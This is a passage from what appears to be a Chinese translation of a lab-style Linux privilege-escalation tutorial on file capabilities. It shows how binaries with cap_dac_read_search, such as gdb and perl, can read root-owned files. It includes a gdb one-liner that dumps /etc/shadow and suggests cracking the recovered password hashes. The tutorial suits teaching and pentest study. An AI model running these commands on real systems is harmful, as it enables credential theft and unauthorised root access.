<p>我们看到 capabilities 被作为一个函数被列出，但如果我们只过滤具有此函数的二进制文件（即过滤条件为 +capabilities），我们就会错过很多其它可能。例如，让我们关注列表中的第一个功能：cap_dac_read_search。由于此功能允许我们以 root 级权限读取文件，我们可以过滤到 “File Read” 而不是 “Capabilities” ，我们会发现还有更多二进制文件可供使用。</p>
<p>上述陈述很重要，因为我们可能会找到具有功能集的二进制文件，但是当我们在仅过滤 capabilities 函数后检查 GTFOBins 时，我们可能看不到我们针对的二进制文件，然后假设它不存在漏洞。</p>
<blockquote>
<p>注：当二进制命令拥有了像如 cap_dac_read_search 这样的能力时，即便该程序在 GTFOBins 网站中的 +capabilities 过滤条件下并未出现，但只要在 +file read 过滤条件下出现，那么就可以使用该命令对应的读文件的特殊方法进行任意特权文件的读取。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31cap_dac_read_search"><strong><div id="id3.1">3.1、cap_dac_read_search</div></strong><a href="#31cap_dac_read_search" class="hash-link" aria-label="31cap_dac_read_search的直接链接" title="31cap_dac_read_search的直接链接">​</a></h4>
<p>cap_dac_read_search 功能可让用户读取文件系统中的任意文件，包括 root 拥有的所有文件。如果我们发现文本编辑器（vim、nano 等）、脚本语言（python、perl、node 等）或压缩二进制文件（tar、zip、gzip 等）等二进制文件具有这种功能设置，我们就可以查找并读取系统中的任何敏感文件。</p>
<p>寻找 JUICY 文件有很多好去处；不过，这种功能通常不会为我们提供直接的 root 访问权限，但可以利用它来连锁利用以获得 root 权限。例如，如果 myapp.cnf 文件位于应用根目录中，并且具有 MySQL root 使用凭证，该怎么办？- 如果是这样，我们就有可能利用这一功能找到 MySQL 凭据以进入数据库。这样，我们就能发现 MySQL 服务器存在 UDF 漏洞，从而将我们提升到根目录。</p>
<blockquote>
<p>要了解如何使用 MySQL 中的 UDF 漏洞将权限从标准用户提升到 root，请查看<a href="https://juggernaut-sec.com/mysql-user-defined-functions/" target="_blank" rel="noopener noreferrer">此处</a>我关于此主题的帖子。</p>
</blockquote>
<p>好的，从 PEAS 和手动枚举的输出中，我们可以看到以下二进制文件启用了 cap_dac_read_search 功能：<strong>gdb</strong>、<strong>perl</strong>、<strong>tar</strong>、<strong>vim</strong>。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="311cap_dac_read_search--gdb"><strong><div id="id3.1.1">3.1.1、cap_dac_read_search – gdb</div></strong><a href="#311cap_dac_read_search--gdb" class="hash-link" aria-label="311cap_dac_read_search--gdb的直接链接" title="311cap_dac_read_search--gdb的直接链接">​</a></h6>
<p>如前所述，当检查<strong>gdb</strong>二进制文件的 GTFOBins 时，我们可以看到相当多的可用函数。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="779" height="72" class="img_ev3q"></p>
<p>由于显而易见的原因，最突出的函数是 capabilities 函数；但是，如前所述，只有在二进制文件上设置了 cap_setuid 时，该函数才有用。由于 cap_dac_read_search 使我们能够读取敏感文件，因此我们应该将重点放在文件读取函数上。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164304556-1910256096-89a913ee60600626f17c207e01a74a3a.png" width="821" height="187" class="img_ev3q"></p>
<p>现在我们知道要查找什么并且有了要使用的命令，让我们使用 gdb 转储 /etc/shadow 文件。</p>
<blockquote>
<p>需要注意的是，我们需要使用二进制文件的绝对路径，或者cd到包含二进制文件的文件夹并使用 ./ 符号来执行我们的命令。由于设置了 capabilities 的二进制文件是原始二进制文件的副本，如果我们使用相对路径来执行它们，它将遵循 PATH 变量并最终执行默认的二进制命令而非设置了capabilities的命令。对于这些示例，我们将使用绝对路径来 100% 确保我们使用的是正确的二进制文件。此示例中的二进制文件位于 Juggernaut 用户家目录中下的名为 /bin 的自定义文件夹中。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/home/juggernaut/bin/gdb -nx -ex &#x27;python print(open(&quot;/etc/shadow&quot;).read())&#x27; -ex quit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240617164310224-1877926847-bab778945c8605220fae724ac4aeff2f.png" width="1005" height="462" class="img_ev3q"></p>
<p>轰！就这样，我们发现自己能够读取影子文件，而作为标准用户，我们本不应该能够读取它。这样，我们现在就可以获取 root 哈希以及我们找到的所有其他用户哈希，并尝试破解它们，以将我们的权限水平提升到另一个标准用户或垂直提升到 root 用户。</p>
<h6 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="312cap_dac_read_search--perl"><strong><div id="id3.1.2">3.1.2、cap_dac_read_search – perl</div></strong><a href="#312cap_dac_read_search--perl" class="hash-link" aria-label="312cap_dac_read_search--perl的直接链接" title="312cap_dac_read_search--perl的直接链接">​</a></h6>
<p>与我们使用 gdb 二进制文件时一样，对于<strong>perl</strong>，我们也希望关注文件读取功能。</p>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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